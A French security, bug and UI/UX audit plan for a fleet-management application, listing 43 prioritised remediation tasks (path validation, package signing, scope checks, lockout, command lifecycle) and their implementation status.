# Audit de novembre 2026 (sécurité, bugs, UI/UX) : plan de travail

> **Statut : audit livré le 2026-11-10. Les 43 tâches (T01 à T43) corrigées le 2026-11-11 (§6). Une seconde passe de vérification, le 2026-11-13, a relevé des écarts, majeurs ou résiduels, sur 25 tâches, dont une régression (T09) ; ils sont repris le même jour (§6.1, branche `claude/inspiring-tesla-m56uvk`). Écarts restants, acceptés : les sauvegardes ne sont pas chiffrées (T40), et les limites listées au §6.2.** L'audit porte sur le commit `fc5c507` (`main`, après la PR #102 du déploiement logiciel). Il a retenu **102 constats vérifiés**, regroupés en **43 tâches** classées en quatre priorités (§3) : 5 immédiates, 17 à court terme, 11 à moyen terme et 10 de fond. Chaque tâche est aussi reportée dans le document de travail du chantier qu'elle touche (§4), dans le même ordre.
>
> **Objectif :** corriger d'abord ce qui permet une exécution de code sur les postes, une escalade de droits ou une fuite hors périmètre, puis ce qui fausse des données ou bloque une fonction, et enfin le confort d'usage.
>
> **Ce document reste la référence.** Le détail de chaque constat (preuve, scénario, recommandation) est au §7. Les identifiants `Sxx` (sécurité), `Bxx` (bugs) et `Uxx` (UI/UX) y renvoient. Les tâches `Txx` sont la seule numérotation à reprendre dans les commits et les PR.

---

## 1. Méthode

Seize auditeurs indépendants ont lu le code en entier, chacun sur un angle et un périmètre précis :

- 6 en sécurité : authentification, droits et périmètres, protocole agent, exécution à distance, injections et exports, infrastructure et dépendances ;
- 6 sur les bugs : postes, opérations, administration, commandes et paquets, agent Go et migrations, contrat API front/back ;
- 4 en UI/UX : navigation, formulaires, parcours opérationnels, et une inspection visuelle de la console servie avec des données fictives (bureau 1440 px, mobile 390 px).

Chaque lot de constats est ensuite passé par un vérificateur chargé de les réfuter. Les constats classés critiques ou élevés ont reçu en plus une contre-expertise indépendante. Sur 120 constats bruts, aucun n'a été réfuté. Après fusion des doublons trouvés sous plusieurs angles, il en reste **102**. « Plausible » signale un constat qui dépend d'un contexte qu'on n'a pas pu vérifier, par exemple le rendu réel sur un appareil donné.

Les auditeurs n'ont pas pu lancer la suite de tests backend, faute de PostgreSQL disponible : les comportements ont été vérifiés par lecture du code.

**Contre-vérification du 2026-11-11.** Les 102 constats ont été confrontés une seconde fois au code par des relecteurs indépendants, chargés de les réfuter. Aucun n'est réfuté. 32 contenaient un détail inexact (numéro de ligne, chiffre, exemple de scénario ou portée), corrigé depuis dans ce document. S01 a été reproduit par un test Go sur une copie de l'agent, et les constats UI/UX ont été rejoués sur la console construite, avec une API simulée. Deux recommandations ont changé, celles de S22 et de S31, et avec elles les tâches T37 et T40. Restent non testés : le rendu des séquences de contrôle dans une console Windows (S25), la lecture de `2GB` par Caddy (B31, U16) et le comportement des gestionnaires de mots de passe (U15).

## 2. Synthèse

| Angle | Élevée | Moyenne | Faible | Info | Total |
|---|---|---|---|---|---|
| Sécurité | 2 | 9 | 23 | 2 | 36 |
| Bugs fonctionnels frontend / backend | 0 | 17 | 19 | 0 | 36 |
| UI / UX | 0 | 6 | 23 | 1 | 30 |

**Aucun constat critique.** Le socle est sérieux. Les points suivants ont été contrôlés et n'appellent pas de remarque :

- les mots de passe : bcrypt, avec un faux hachage pour neutraliser les attaques temporelles ;
- les sessions : jeton d'accès en mémoire, liée à une session serveur, et jeton de rafraîchissement à usage unique en cookie HttpOnly, SameSite=Strict, avec détection de réutilisation ;
- l'enrôlement des agents : comparaison à temps constant, approbation exigée pour un poste qui a déjà un token actif ;
- le catalogue de commandes, réellement fermé des deux côtés ;
- les exports : aucune injection de formule ni de SQL brut ;
- l'en-tête CSP et les ACL Windows.

Les faiblesses se concentrent sur cinq sujets :

1. **Les paquets de déploiement**, la fonction la plus récente. Deux constats élevés relèvent de l'exécution de code en SYSTEM sur les postes si le serveur est compromis : S01 et S02. S'y ajoutent des fichiers orphelins sur disque (S09) et des déploiements cassés par le remplacement d'un fichier (B13).
2. **Les périmètres** : escalade possible via la modification d'un groupe (S05), séance de maintenance visible hors périmètre (S06), journal d'audit non filtré (S17).
3. **Le cycle de vie des commandes** : les commandes transmises ne sont jamais relivrées ni expirées (B10), se perdent quand la file de l'agent est pleine (B15) ou à l'arrêt du service (B16), et leur ordre de remise n'est pas garanti (B28).
4. **La maintenance** : une date future ou une ligne supprimée fausse l'échéance (B06), et les comptes désactivés bloquent des écrans (B08).
5. **Des pertes de saisie et des messages d'erreur génériques** dans la console (U03, U05, U14).

## 3. Plan de travail par priorité

> Coché = fait. Une tâche n'est cochée qu'avec son test de non-régression. La date et l'écart éventuel par rapport à la recommandation sont notés au §6.

### Priorité 0 — immédiate

Exécution de code en SYSTEM sur les postes si le serveur est compromis, escalade de périmètre, fuite hors périmètre, exfiltration de secrets. À traiter avant toute nouvelle fonctionnalité.

- [x] **T01 — Agent : n'accepter qu'un UUID comme identifiant de paquet** ([S01](plan-audit-2026-11.md#s01))
  Dans `agent/internal/deploy/executor.go`, refuser tout `pkg.ID` qui n'est pas un UUID canonique avant `MkdirAll`. En défense en profondeur, vérifier par `filepath.Rel` que le répertoire de travail reste sous `PackagesDir` avant d'écrire et avant `RemoveAll`. Ajouter un test avec un identifiant contenant `..`.
  *Document de travail :* `plan-deploiement-logiciel.md`

- [x] **T02 — Méthode A : plus de fichier chargeable non signé à côté de l'exécutable** ([S02](plan-audit-2026-11.md#s02))
  En méthode A, ne télécharger que le fichier lancé : refuser un manifeste non signé qui en nomme d'autres, ou au minimum refuser les extensions chargeables (`.dll`, `.ocx`, `.cpl`, `.sys`, `.manifest`, `.local`, `.config`). Purger le répertoire du paquet avant chaque exécution.
  *Document de travail :* `plan-deploiement-logiciel.md`

- [x] **T03 — Groupes : contrôler l'autorité des membres à la modification** ([S05](plan-audit-2026-11.md#s05))
  Dans `PATCH /groups/{id}` (`backend/app/api/routes/groups.py`), appliquer `reject_escalation` à l'autorité de chaque membre, comme le fait `PATCH /users`, ou réserver la modification des permissions aux comptes sans restriction. Ajouter à `test_api_scope.py` le cas d'un membre partagé avec un groupe sans restriction.
  *Document de travail :* `plan-salles-maintenance-interventions.md`

- [x] **T04 — Séance de maintenance : filtrer ses postes par périmètre** ([S06](plan-audit-2026-11.md#s06))
  Passer `scope` à `_session_out` dans le détail d'une séance (`backend/app/api/routes/maintenance.py:594`). Ajouter un test avec une séance à cheval sur deux sites.
  *Document de travail :* `plan-salles-maintenance-interventions.md`

- [x] **T05 — Réglages e-mail : ne plus réutiliser un secret stocké vers un nouvel hôte** ([S10](plan-audit-2026-11.md#s10))
  Quand l'hôte, le port ou le mode de sécurité SMTP changent, ou l'URL ou le domaine Mailgun, exiger que le mot de passe ou la clé soient ressaisis dans la même requête, pour l'e-mail de test comme pour le `PATCH` (`settings_routes.py`).
  *Document de travail :* `plan-projet-tiai.md`

### Priorité 1 — court terme

Déni de service sur les comptes, intégrité des déploiements et des commandes, et bugs qui faussent des données ou bloquent une fonction pour tous.

- [x] **T06 — Verrouillage de compte : supprimer le déni de service et l'énumération** ([S03](plan-audit-2026-11.md#s03), [S12](plan-audit-2026-11.md#s12), [S13](plan-audit-2026-11.md#s13))
  Ne plus refuser le bon mot de passe pendant un verrouillage : passer à un délai progressif, ou ne verrouiller que par couple compte et adresse IP. Répondre au compte verrouillé par le même 401 générique qu'à un échec, en calculant tout de même un bcrypt. Incrémenter `failed_login_attempts` de façon atomique en base.
  *Document de travail :* `plan-projet-tiai.md`

- [x] **T07 — `POST /auth/password` : limite de débit et bcrypt hors de la boucle** ([S04](plan-audit-2026-11.md#s04))
  Ajouter un limiteur indexé par compte, compter les échecs de `current_password` et révoquer la session après N échecs. Exécuter bcrypt dans `asyncio.to_thread` sur ce chemin comme sur celui de connexion.
  *Document de travail :* `plan-projet-tiai.md`

- [x] **T08 — Figer le contenu d'un paquet à la mise en file** ([S08](plan-audit-2026-11.md#s08))
  Enregistrer sur la commande une empreinte du paquet approuvé (manifeste, signature, winget et version), et la passer en `failed` à la livraison si le paquet a changé depuis (`agent.py:408`).
  *Document de travail :* `plan-deploiement-logiciel.md`

- [x] **T09 — Fichiers de paquet : plus d'orphelin, plus de déploiement cassé** ([S09](plan-audit-2026-11.md#s09), [B13](plan-audit-2026-11.md#b13))
  Au remplacement d'un fichier et après un dépôt multiple en échec, supprimer les fichiers stockés qui ne sont plus référencés. Ne pas supprimer un fichier qu'une commande ouverte doit encore télécharger, et servir le téléchargement à partir de l'empreinte remise (`packages.py:383`, `agent.py:998`).
  *Document de travail :* `plan-deploiement-logiciel.md`

- [x] **T10 — Cycle de vie des commandes remises : relivraison, expiration, pertes côté agent** ([B10](plan-audit-2026-11.md#b10), [B15](plan-audit-2026-11.md#b15), [B16](plan-audit-2026-11.md#b16), [B34](plan-audit-2026-11.md#b34))
  Choisir une règle unique : soit le serveur relivre les commandes « Transmise » sans verdict après un délai (l'agent est déjà idempotent par identifiant), soit le worker les expire. La même règle doit fermer les « En cours » trop anciennes, que rien ne purge aujourd'hui. Côté agent, ne jamais jeter une commande acceptée : file pleine, arrêt du service ou type inconnu donnent un résultat `failed` explicite, rejoué par `queue.Queue`.
  *Document de travail :* `plan-commandes-distantes.md`

- [x] **T11 — Remettre les commandes dans l'ordre de création** ([B28](plan-audit-2026-11.md#b28))
  Ajouter `order_by(created_at, id)` à la sélection du heartbeat (`agent.py:815`), avec un test : « installer les MAJ » puis « redémarrer » doivent être remises dans cet ordre.
  *Document de travail :* `plan-commandes-distantes.md`, `plan-phase2-windows-update.md`

- [x] **T12 — Export Excel : neutraliser les caractères de contrôle** ([S11](plan-audit-2026-11.md#s11))
  Dans `xlsx_response`, retirer les caractères refusés par openpyxl (`ILLEGAL_CHARACTERS_RE`), et idéalement dès la réception du heartbeat, dans `bound_text`.
  *Document de travail :* `plan-inventaire.md`

- [x] **T13 — Placement par l'annuaire : borner le nom de salle à la colonne** ([S07](plan-audit-2026-11.md#s07))
  Tronquer le nom en tenant compte du suffixe dans `room_for_key` (`room/crud.py:287`), aligner les bornes de `ad_location` et de `ou` sur la colonne, et isoler l'échec du placement pour qu'il ne fasse plus échouer le heartbeat en 500.
  *Document de travail :* `plan-salles-maintenance-interventions.md`

- [x] **T14 — Fiche poste et tableau de bord sans `threat:read` ni `command:read`** ([B02](plan-audit-2026-11.md#b02))
  Ne charger les menaces et les commandes que si l'utilisateur a le droit de les lire, et charger les données annexes avec `Promise.allSettled` (`MachineDetailPage.vue:750`, `DashboardPage.vue`).
  *Document de travail :* `plan-projet-tiai.md`

- [x] **T15 — Remettre « Rafraîchir l'inventaire » dans les menus** ([B12](plan-audit-2026-11.md#b12))
  Ajouter `'inventory'` à `groupOrder` (`frontend/src/services/commands.ts:324`), avec un test qui vérifie que chaque action du catalogue apparaît dans un groupe.
  *Document de travail :* `plan-inventaire.md`, `plan-commandes-distantes.md`

- [x] **T16 — Échéance de maintenance : la recalculer depuis le journal** ([B06](plan-audit-2026-11.md#b06), [B17](plan-audit-2026-11.md#b17))
  Recalculer `last_maintenance_at` comme le maximum des `performed_at` de type maintenance à chaque création, modification ou suppression d'une intervention. Refuser côté serveur une date future, à la séance de maintenance comme dans le journal.
  *Document de travail :* `plan-salles-maintenance-interventions.md`

- [x] **T17 — Responsables désactivés ou supprimés : ne plus bloquer la maintenance** ([B08](plan-audit-2026-11.md#b08), [B35](plan-audit-2026-11.md#b35))
  Traiter un responsable inactif ou supprimé comme « sans responsable » dans `resolve()`, et proposer une réaffectation à la désactivation. Les `PATCH` des vérifications, du cycle et de la carte Maintenance des réglages ne doivent plus échouer en 404 tant qu'on ne change pas ce responsable. Ouvrir la liste des responsables possibles à `maintenance:write` et `settings:write`.
  *Document de travail :* `plan-salles-maintenance-interventions.md`

- [x] **T18 — Suppression d'un bâtiment : gérer les noms de salle en collision** ([B07](plan-audit-2026-11.md#b07))
  Détecter la collision avant la suppression (`rooms.py:451`) et renvoyer un 409 qui liste les salles concernées, ou les renommer avec un suffixe comme le fait `room_for_key`.
  *Document de travail :* `plan-salles-maintenance-interventions.md`

- [x] **T19 — Carte « Disque presque plein » : respecter le seuil réglé** ([B01](plan-audit-2026-11.md#b01))
  Accepter tout seuil de 1 à 99 dans `machineFiltersFromQuery` (`machineListFilters.ts:314`) et l'afficher dans la puce de filtre.
  *Document de travail :* `plan-inventaire.md`

- [x] **T20 — Liste et fiche des postes : signaler les échecs de chargement** ([B04](plan-audit-2026-11.md#b04), [U01](plan-audit-2026-11.md#u01))
  Distinguer le rafraîchissement automatique, qui reste silencieux, du chargement demandé : sur ce dernier, notifier l'erreur et vider ou griser les lignes périmées. Sur la fiche, afficher un état de chargement ou d'erreur quand on passe au poste précédent ou suivant.
  *Document de travail :* `plan-projet-tiai.md`

- [x] **T21 — `useAutoRefresh` : plus de relance après le démontage** ([B11](plan-audit-2026-11.md#b11))
  Ajouter un drapeau `disposed` et ne relancer le minuteur que s'il est faux. Couvrir le cas dans le test du composable.
  *Document de travail :* `plan-projet-tiai.md`

- [x] **T22 — Fusion de postes : conserver `first_seen` et les réglages de maintenance** ([B03](plan-audit-2026-11.md#b03))
  Dans `merge_into`, garder le plus ancien `first_seen` et reprendre le cycle et le responsable de maintenance quand la cible n'en a pas. Ajouter un test.
  *Document de travail :* `plan-projet-tiai.md`

### Priorité 2 — moyen terme

Pertes de saisie, confirmations manquantes, cas secondaires de périmètre, et parcours du technicien.

- [x] **T23 — Déploiement : confirmation et refus des paquets inexécutables** ([U04](plan-audit-2026-11.md#u04), [B30](plan-audit-2026-11.md#b30))
  Réinitialiser le ciblage à chaque ouverture du dialogue. Demander une confirmation qui annonce le nombre de postes pour « Tout le parc » et pour toute désinstallation. Refuser, côté serveur comme dans le dialogue, un paquet de fichiers qu'aucune méthode de confiance ne couvre.
  *Document de travail :* `plan-deploiement-logiciel.md`

- [x] **T24 — Fiche paquet : saisie préservée, dépôt contrôlé, messages justes** ([U05](plan-audit-2026-11.md#u05), [U16](plan-audit-2026-11.md#u16), [B31](plan-audit-2026-11.md#b31), [B36](plan-audit-2026-11.md#b36))
  Ne plus écraser le formulaire non enregistré après un dépôt, une signature ou un retrait. Vérifier la taille avant l'envoi, permettre l'annulation et traduire le 413 de Caddy. Passer le plafond Caddy à `2GiB`, et créer un code d'erreur « fichier introuvable dans ce paquet ».
  *Document de travail :* `plan-deploiement-logiciel.md`

- [x] **T25 — Fiche paquet : pagination et bilan des déploiements** ([B14](plan-audit-2026-11.md#b14))
  Brancher la pagination côté serveur et afficher un décompte par statut du dernier déploiement (`PackageDetailPage.vue:313`).
  *Document de travail :* `plan-deploiement-logiciel.md`

- [x] **T26 — Groupes : ne plus perdre un emplacement saisi sans Entrée** ([U02](plan-audit-2026-11.md#u02))
  Valider le texte en cours de saisie à la perte du focus et avant l'enregistrement, et demander confirmation avant d'enregistrer un groupe qui s'ouvrirait à tout le parc (`GroupsPage.vue:197`).
  *Document de travail :* `plan-salles-maintenance-interventions.md`

- [x] **T27 — Afficher les messages d'erreur utiles du backend** ([U03](plan-audit-2026-11.md#u03))
  Pour les codes dont le message est rédigé pour l'utilisateur (`package.invalid` en tête), afficher le détail. Pour une erreur de validation, nommer le champ fautif (`errors.ts:90`).
  *Document de travail :* `plan-projet-tiai.md`

- [x] **T28 — Réglages : valider les seuils côté client** ([U06](plan-audit-2026-11.md#u06))
  Pour chaque carte de réglages : champ requis, entier, dans les bornes du serveur, erreur affichée sous le champ et bouton Enregistrer désactivé tant qu'elle persiste. Ne plus convertir un champ vide en 0 (`SettingsPage.vue:844`).
  *Document de travail :* `plan-projet-tiai.md`

- [x] **T29 — Dialogues à saisie précieuse : persistants** ([U14](plan-audit-2026-11.md#u14), [U13](plan-audit-2026-11.md#u13))
  Rendre persistants la séance de maintenance de salle, avec une confirmation si la saisie a été modifiée, et le dialogue qui affiche une seule fois le mot de passe réinitialisé.
  *Document de travail :* `plan-salles-maintenance-interventions.md`, `plan-projet-tiai.md`

- [x] **T30 — Mes tâches et séance de salle : parcours du technicien** ([B09](plan-audit-2026-11.md#b09), [U18](plan-audit-2026-11.md#u18), [U19](plan-audit-2026-11.md#u19), [U20](plan-audit-2026-11.md#u20), [U21](plan-audit-2026-11.md#u21), [U22](plan-audit-2026-11.md#u22), [U23](plan-audit-2026-11.md#u23), [U24](plan-audit-2026-11.md#u24), [U26](plan-audit-2026-11.md#u26))
  Plusieurs corrections du parcours :
  - Ne pré-cocher que les postes dus et décocher les postes exclus.
  - N'afficher dans « à faire » que les salles qui ont quelque chose à faire.
  - Ajouter « Me l'affecter » et « Transmettre » depuis Mes tâches.
  - Compter les maintenances dans le badge et rafraîchir ce badge après une action.
  - Garder les notes des postes non faits.
  - Ajouter des libellés accessibles aux cases à cocher.
  - Afficher « en retard depuis N jours » et des échéances sans heure.
  - Adapter Mes tâches au mobile et élargir la colonne Consignes.
  - Paginer les salles de plus de 200 postes.
  *Document de travail :* `plan-salles-maintenance-interventions.md`

- [x] **T31 — Liste des postes : sélection, navigation et fusion cohérentes** ([B05](plan-audit-2026-11.md#b05), [B18](plan-audit-2026-11.md#b18), [B19](plan-audit-2026-11.md#b19))
  Vider la sélection au changement de filtre ou de page, ou montrer les postes sélectionnés masqués. Ancrer la navigation précédent/suivant sur un curseur stable. Recharger le journal des interventions après une fusion.
  *Document de travail :* `plan-projet-tiai.md`

- [x] **T32 — Périmètres : cas secondaires** ([S16](plan-audit-2026-11.md#s16), [S17](plan-audit-2026-11.md#s17), [S18](plan-audit-2026-11.md#s18))
  Un compte restreint ne doit pas déplacer un bâtiment ou une salle hors de son site. Pour le journal d'audit, filtrer les entrées « poste » par périmètre, ou refuser `audit:read` à un groupe restreint. Refuser d'assigner une vérification à un compte qui ne voit pas le poste, et filtrer `/checks/assignable-users` en conséquence.
  *Document de travail :* `plan-salles-maintenance-interventions.md`

- [x] **T33 — Vérifications concurrentes et salle sortie de son bâtiment** ([B21](plan-audit-2026-11.md#b21), [B22](plan-audit-2026-11.md#b22))
  Transformer en 409 la violation de `uq_machine_checks_open`, utiliser `ON CONFLICT DO NOTHING` pour la création en masse, et faire une clôture atomique. Conserver l'emplacement d'une salle qui quitte son bâtiment.
  *Document de travail :* `plan-salles-maintenance-interventions.md`

### Priorité 3 — fond

Durcissements de fond, infrastructure et finitions. Se traitent par lots, fichier par fichier.

- [x] **T34 — Comptes : réinitialisation et compte initial** ([S14](plan-audit-2026-11.md#s14), [S15](plan-audit-2026-11.md#s15), [S33](plan-audit-2026-11.md#s33))
  Limiter les demandes de réinitialisation par compte cible, sans invalider le lien en cours. Purger les liens de réinitialisation quand un administrateur change l'e-mail. Imposer `PASSWORD_MIN_LENGTH` à `FIRST_ADMIN_PASSWORD`.
  *Document de travail :* `plan-projet-tiai.md`

- [x] **T35 — Wake-on-LAN : ne plus croire l'agent sur parole** ([S19](plan-audit-2026-11.md#s19), [S35](plan-audit-2026-11.md#s35), [B29](plan-audit-2026-11.md#b29))
  Pour le relais : exiger un emplacement validé côté serveur, borner le masque et n'accepter que des réseaux privés ou une liste configurée. Exclure les agents trop anciens pour relayer, et remettre en attente un réveil remis sans verdict.
  *Document de travail :* `plan-projet-tiai.md`

- [x] **T36 — Données déclarées par l'agent : placement en salle et catalogue logiciel** ([S20](plan-audit-2026-11.md#s20), [S21](plan-audit-2026-11.md#s21))
  Vérifier que le DN rapporté est cohérent avec la machine avant de la rattacher à une salle de l'annuaire, et ne plus adopter automatiquement une salle créée à la main. Limiter le débit du heartbeat par poste et purger les logiciels qui ne sont plus installés sur aucun poste.
  *Document de travail :* `plan-salles-maintenance-interventions.md`, `plan-inventaire.md`

- [x] **T37 — Agent : transport et robustesse** ([S22](plan-audit-2026-11.md#s22), [S23](plan-audit-2026-11.md#s23), [S24](plan-audit-2026-11.md#s24), [B32](plan-audit-2026-11.md#b32), [B33](plan-audit-2026-11.md#b33))
  N'accepter `http://` que sur option explicite, en corrigeant `DEPLOYMENT.md` qui le présente aujourd'hui comme accepté, et ne plus suivre les redirections. Borner les corps d'erreur lus, faire tourner le journal à chaud, et borner les téléchargements à la taille annoncée. Distinguer un `token.dat` illisible d'un `token.dat` absent. Allonger le délai entre deux tentatives quand l'enrôlement attend une approbation, et ne l'auditer qu'une fois.
  *Document de travail :* `plan-projet-tiai.md`, `plan-deploiement-logiciel.md`

- [x] **T38 — Script de signature : neutraliser les caractères de contrôle** ([S25](plan-audit-2026-11.md#s25))
  Refuser les caractères de contrôle, ou les afficher échappés, dans le nom, la version, `run` et `args` avant la confirmation, et les rejeter aussi côté serveur.
  *Document de travail :* `plan-deploiement-logiciel.md`

- [x] **T39 — Recherches : échapper `%` et `_`** ([S26](plan-audit-2026-11.md#s26))
  Factoriser `_escape_like` et l'appliquer à toutes les recherches par sous-chaîne : logiciels, postes et comptes.
  *Document de travail :* `plan-inventaire.md`, `plan-projet-tiai.md`

- [x] **T40 — Infrastructure et CI** ([S27](plan-audit-2026-11.md#s27), [S28](plan-audit-2026-11.md#s28), [S29](plan-audit-2026-11.md#s29), [S30](plan-audit-2026-11.md#s30), [S31](plan-audit-2026-11.md#s31), [S32](plan-audit-2026-11.md#s32), [S34](plan-audit-2026-11.md#s34), [S36](plan-audit-2026-11.md#s36))
  Plusieurs durcissements :
  - Sauvegardes : `umask 077`, et chiffrement des dumps (chiffrement non fait, écart accepté : §6).
  - `X-Forwarded-For` : ne le lire que depuis des proxys de confiance, et n'exposer le port de développement que sur `127.0.0.1`.
  - Actions GitHub : les épingler par SHA, avec des permissions minimales.
  - `GIST_SECRET` : le sortir de l'`env` des jobs.
  - nginx : passer à la branche stable courante (`stable-alpine`, 1.30 à ce jour ; la 1.28 n'est déjà plus reconstruite), et ajouter le frontend au scan Trivy.
  - Conteneurs backend et worker : exécution sans root, `cap_drop` et `no-new-privileges`.
  - `index.html` : le servir en `no-cache`.
  - OpenAPI : le couper hors environnement local.
  *Document de travail :* `plan-projet-tiai.md`

- [x] **T41 — Console d'administration : finitions** ([B23](plan-audit-2026-11.md#b23), [B24](plan-audit-2026-11.md#b24), [B25](plan-audit-2026-11.md#b25), [B26](plan-audit-2026-11.md#b26), [B27](plan-audit-2026-11.md#b27))
  Plusieurs finitions :
  - Session expirée : un seul message, au lieu d'un toast « identifiants invalides » par requête.
  - Longueur minimale du mot de passe et durée de validité du lien : les lire depuis le serveur.
  - Journal d'audit : ajouter les libellés des actions sur les paquets, `user.locked` et `machine.reenroll_requested`.
  - Utilisateurs : revenir à la page précédente quand la dernière page se vide.
  - `PATCH` des comptes, groupes et salles : renvoyer 422 au lieu de 500 sur un champ obligatoire envoyé à `null`.
  *Document de travail :* `plan-projet-tiai.md`

- [x] **T42 — Page Logiciels et filtre par logiciel** ([B20](plan-audit-2026-11.md#b20), [U08](plan-audit-2026-11.md#u08), [U09](plan-audit-2026-11.md#u09))
  Mettre la recherche, le tri et la page dans l'URL. Afficher « Vu depuis » dans le fuseau du navigateur. Nommer le logiciel dans la puce de filtre, et distinguer « aucun résultat » d'« erreur ».
  *Document de travail :* `plan-inventaire.md`

- [x] **T43 — Console : finitions visuelles et accessibilité** ([U07](plan-audit-2026-11.md#u07), [U10](plan-audit-2026-11.md#u10), [U11](plan-audit-2026-11.md#u11), [U12](plan-audit-2026-11.md#u12), [U15](plan-audit-2026-11.md#u15), [U17](plan-audit-2026-11.md#u17), [U25](plan-audit-2026-11.md#u25), [U27](plan-audit-2026-11.md#u27), [U28](plan-audit-2026-11.md#u28), [U29](plan-audit-2026-11.md#u29), [U30](plan-audit-2026-11.md#u30))
  Plusieurs finitions :
  - Tableau de bord : n'afficher l'état vide qu'une fois les données chargées.
  - Retour arrière : restaurer la position de défilement.
  - Dialogue de fusion : utilisable sur mobile.
  - Révocation du jeton : bouton « Révoquer » en rouge.
  - Comptes : renseigner `autocomplete` sur les formulaires.
  - Réglages : reformuler l'aide sur la vérification du certificat, et empiler les lignes de réglages serveur sur mobile.
  - Liste des postes : jeu de colonnes par défaut resserré, avec première colonne collante.
  - Badge antivirus : couleur cohérente avec son libellé.
  - En-tête mobile : masquer l'e-mail.
  - Boutons de la fiche : une seule casse.
  *Document de travail :* `plan-projet-tiai.md`

## 4. Répartition dans les documents de travail

Chaque document de travail de chantier porte, dans une section « Suites de l'audit 2026-11 », les tâches qui le concernent, dans l'ordre de priorité. `plan-projet-tiai.md` porte celles qui ne relèvent d'aucun chantier particulier (authentification, console, infrastructure, agent), et renvoie ici pour le tableau d'ensemble.

| Document | Tâches |
|---|---|
| [plan-deploiement-logiciel.md](plan-deploiement-logiciel.md) | T01, T02, T08, T09, T23, T24, T25, T37, T38 |
| [plan-commandes-distantes.md](plan-commandes-distantes.md) | T10, T11, T15 |
| [plan-phase2-windows-update.md](plan-phase2-windows-update.md) | T11 |
| [plan-salles-maintenance-interventions.md](plan-salles-maintenance-interventions.md) | T03, T04, T13, T16, T17, T18, T26, T29, T30, T32, T33, T36 |
| [plan-inventaire.md](plan-inventaire.md) | T12, T15, T19, T36, T39, T42 |
| [plan-projet-tiai.md](plan-projet-tiai.md) | T05, T06, T07, T14, T20, T21, T22, T27, T28, T29, T31, T34, T35, T37, T39, T40, T41, T43 |

`plan-session-utilisateur.md` et `plan-utilisation-postes.md` ne sont concernés par aucun constat.

## 5. Points d'attention

- **T01, T02 et T37 ne protègent qu'après la mise à jour des agents.** Tant que le parc garde l'agent actuel, la méthode A reste exposée. Il faut publier une nouvelle version de l'agent (MSI et GPO), et en attendant, ne pas activer `DeployPublishers` sur de nouveaux postes.
- **T10 touche le protocole des deux côtés.** Sur un parc à versions mixtes, un agent ancien ne saura pas rendre un verdict `failed` pour une commande qu'il a jetée. La règle côté serveur (relivraison ou expiration) doit donc suffire seule, et le côté agent n'est qu'un raccourci.
- **T16 demande une migration de données.** Il faut recalculer une fois `last_maintenance_at` pour tout le parc à partir du journal, en vérifiant au préalable combien de postes changeraient d'échéance.
- **T03 et T32 peuvent refuser des opérations qui passaient jusqu'ici** à un administrateur délégué. Il faut l'annoncer dans les notes de version, avec le message d'erreur précis.
- **T37 change un mode documenté.** `DEPLOYMENT.md` présente `http://` comme accepté par l'agent et l'emploie dans l'exemple du port direct. Les postes installés ainsi cesseront de s'enrôler si l'option explicite n'est pas posée avant la mise à jour de l'agent : il faut corriger la documentation et prévenir dans les notes de version.
- **T06 change le comportement visible du verrouillage.** Le README et la page Utilisateurs décrivent le verrouillage actuel : il faut les mettre à jour en même temps.
- **Tests backend :** l'audit n'a pas pu lancer la suite sur PostgreSQL. Chaque correction backend doit passer la CI avec la base, en particulier `test_api_scope.py` pour T03, T04 et T32.

## 6. Écarts constatés à l'implémentation

*À compléter tâche par tâche, au fil des corrections : date, PR, et écart éventuel par rapport à la recommandation.*

| Tâche | Date | Branche | Écart ou précision |
|---|---|---|---|
| T01 | 2026-11-11 | `claude/sweet-cray-xhpetg` | UUID canonique en minuscules exigé dès l'entrée d'`executeFiles` (avant tout décodage), puis `PackageDir` vérifie par `filepath.Rel` que le dossier est l'enfant direct de `PackagesDir`. |
| T02 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Option « au minimum » retenue, élargie : le cas Pronote (`.exe` + `.iss`) reste possible en méthode A. Liste refusée plus large que celle de la recommandation (autres `.exe`, `.msi`/`.msp`/`.mst`, scripts, `.mui`, `.tlb`, `.inf`, `.lnk`…). Plutôt qu'une purge totale, qui casserait la reprise des gros téléchargements, l'agent retire avant chaque exécution tout ce que le manifeste ne nomme pas ; les fichiers nommés sont revérifiés par empreinte. La désinstallation `msiexec /x {code}` en méthode A ne télécharge plus aucun fichier. Guide `deploy/packages/README.md` mis à jour. |
| T03 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Quand un non-administrateur change les permissions ou le périmètre d'un groupe, chaque membre est passé à `reject_escalation` (action `edit_members`). Renommer ou décrire le groupe reste permis. Message de la console complété. |
| T04 | 2026-11-11 | `claude/sweet-cray-xhpetg` | En plus du détail, le décompte `machine_count` (détail et liste des séances) ne compte plus que les postes du périmètre : il révélait le nombre de postes hors périmètre. |
| T05 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Nouveau code `settings.email.secret_required` (422, `details.fields`). La destination est comparée après résolution, environnement compris : un secret remis à `null` (celui du `.env`) ne compte pas comme ressaisi. Désactiver la vérification du certificat SMTP compte comme un changement de destination ; la réactiver, non. Le message du test Mailgun ne reprend plus que le champ `message` d'une réponse JSON, plus le corps brut. |
| T06 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Option « verrouiller par couple compte et adresse IP », sous cette forme : le compte se verrouille toujours après N échecs (toutes adresses confondues, compteur incrémenté par `UPDATE … RETURNING`), mais le verrou ne refuse que les adresses qui ont échoué sur ce compte pendant la durée du verrou (mémoire en processus, comme le limiteur de débit). Le bon mot de passe saisi ailleurs ouvre la session et lève le verrou. Le 423 disparaît : verrou et échec répondent le même 401, bcrypt compris. Pas de décroissance du compteur dans le temps : un verrou ne gêne plus que les adresses fautives, ce qui rend un compteur ancien sans conséquence. Textes de `.env.example` et de la page Utilisateurs mis à jour. |
| T07 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Limite de 5 essais par 15 min et par compte. Un mauvais mot de passe actuel compte comme un échec de connexion ; celui qui verrouille le compte révoque aussi toutes ses sessions, jeton de l'appelant compris, et s'inscrit au journal (`user.locked`, `via: password_change`). bcrypt passe par `asyncio.to_thread` partout (connexion, changement, réinitialisation, création de compte). |
| T08 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Migration `0030` : `commands.package_digest` (SHA-256 du genre, de l'identifiant et de la version winget, du manifeste, de la signature, du certificat et des fichiers) et `commands.package_files`. À la livraison, une empreinte différente passe la commande en `failed` avec un message qui invite à relancer. Les commandes antérieures à la migration (empreinte nulle) sont livrées comme avant. |
